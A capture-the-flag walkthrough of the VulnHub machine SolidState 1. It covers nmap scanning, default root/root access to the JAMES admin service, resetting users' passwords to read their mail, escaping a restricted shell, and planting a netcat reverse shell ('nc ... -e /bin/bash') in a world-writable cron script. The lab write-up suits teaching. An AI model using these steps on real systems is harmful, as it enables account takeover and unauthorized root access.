---
title: VulnHub - SolidState 1
author: ret2x
date: 2022-01-04 23:18:20 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub]
image:
    path: /assets/images/solidstate/front.png
---

**Description:** A linux machine which requires to enumerate and interacting with a custom service running on an arbitrary port in order to discover the necessary clues to gain the first foothold. Incorrect practices when setting cron jobs granted root privileges.

**Author:** Ch33z_plz

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/solidstate-1,261/](https://www.vulnhub.com/entry/solidstate-1,261/)

## Information Gathering
### Host Discovery

The following command performs a ping scan to discover the target machine on the local network.

```console
root@kali:~$ nmap -n -sn 192.168.179.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 13:56 -05
Nmap scan report for 192.168.179.185
...
```

### Port Scanning

To detect open ports a full TCP port scan was performed with nmap.

```console
root@kali:~$ nmap -v -n -T4 -p- 192.168.179.185 -oG nmap/all.tcp-ports.txt 
...
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
...
```


### Service Enumeration

With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.

```console
root@kali:~$ nmap -A -p22,25,80,110,119,4555 -n -v -Pn 192.168.179.185 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE     VERSION                                                                                                                                  
22/tcp   open  tcpwrapped                                                                                                                                           
| ssh-hostkey:                                                                                                                                                      
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)                                                                                                      
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)                                                                                                     
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)                                                                                                   
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.179.1 [192.168.179.1]), PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security 
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
...
```

### Web Enumeration

In the web page was not possible to find valuable information.

![](/assets/images/solidstate/screenshot-1.png)

The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.

```console
root@kali:~$ gobuster dir -u http://192.168.179.185/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x html,php,txt
...
http://192.168.179.185/images               (Status: 301) [Size: 319] [--> http://192.168.179.185/images/]
http://192.168.179.185/about.html           (Status: 200) [Size: 7182]                                    
http://192.168.179.185/index.html           (Status: 200) [Size: 7776]                                    
http://192.168.179.185/services.html        (Status: 200) [Size: 8404]                                    
http://192.168.179.185/assets               (Status: 301) [Size: 319] [--> http://192.168.179.185/assets/]
http://192.168.179.185/README.txt           (Status: 200) [Size: 963]                                     
http://192.168.179.185/LICENSE.txt          (Status: 200) [Size: 17128]                                   
http://192.168.179.185/server-status        (Status: 403) [Size: 303]
```

### Enumeration on port 4555

By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.

```console
root@kali:~$ telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Executing the **help** command we can see the list of available commands to the root user.

```console
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

We list the users by typing the **listusers** command.

```console
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We create the user **s4rgaz**.

```console
adduser s4rgaz 123
User s4rgaz added
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: s4rgaz
user: mailadmin
quit
Bye
Connection closed by foreign host.
root@kali:~$
```

### Enumeration on service pop3

By logging in to pop3 service as user **s4rgaz**, we have successful access, so we can manage the users to be able to access to pop3 service.

```console
root@kali:~$ telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user s4rgaz
+OK
pass 123
+OK Welcome s4rgaz
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~$
```

We go back to the service running on port 4545 and change john’s password.

```console
root@kali:~$ telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
setpassword john john
Password for john reset
```

We log in on pop3 service as user john, in the mail it indicates that access to **mindy** is restricted.

```console
root@kali:~$ telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

Then we change mindy’s password.

```console
root@kali:~$ telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
setpassword mindy mindy
Password for mindy reset
```

We login as user **mindy** on pop3 service and see her SSH login credentials.

```console
root@kali:~$ telnet 192.168.179.185 110                                                                                                                  
Trying 192.168.179.185...                                                                                                                                           
Connected to 192.168.179.185.                                                                                                                                       
Escape character is '^]'.                                                                                                                                           
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready                                                                                                          
user mindy                                                                                                                                                          
+OK                                                                                                                                                                 
pass mindy                                                                                                                                                          
+OK Welcome mindy                                                                                                                                                   
list                                                                                                                                                                
+OK 2 1945                                                                                                                                                          
1 1109                                                                                                                                                              
2 836                                                                                                                                                               
. 
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

## Exploitation
### Access via SSH

We access to the server via SSH as user **mindy**.

```console
root@kali:~$ ssh -l mindy 192.168.179.185 
mindy@192.168.179.185's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
```

We found the flag in her home directory.

```console
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~$
```

By trying to execute some system commands, we see that we are under a restricted shell.

```console
mindy@solidstate:~$ cd bin/
-rbash: cd: restricted
mindy@solidstate:~$ ip addr
-rbash: ip: command not found
mindy@solidstate:~
```

To bypass the jailed shell, we type **bash -i** to the SSH command.

```console
root@kali:~$ ssh -l mindy 192.168.179.185 "bash -i"                          
mindy@192.168.179.185's password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

Now we can run any system command, a python script was found in the **/opt** directory, probably a cron job is running this file.

```console
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

## Privilege Escalation
### Cron Job

We add the following instruction to the end of the **tmp.py** file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.

```console
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ echo "os.system('nc 192.168.179.1 1337 -e /bin/bash')" >> tmp.py
```

We set up a netcat listener on port 1337, wait a moment and we have a root shell.

```console
root@kali:~$ nc -vlnp 1337
listening on [any] 1337 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.185] 40466
script -qc /bin/bash /dev/null
root@solidstate:~# ls
ls
root.txt
root@solidstate:~# cat root.txt
cat root.txt
b4c9723a28899b1c45db281d99cc87c9
root@solidstate:~#
```
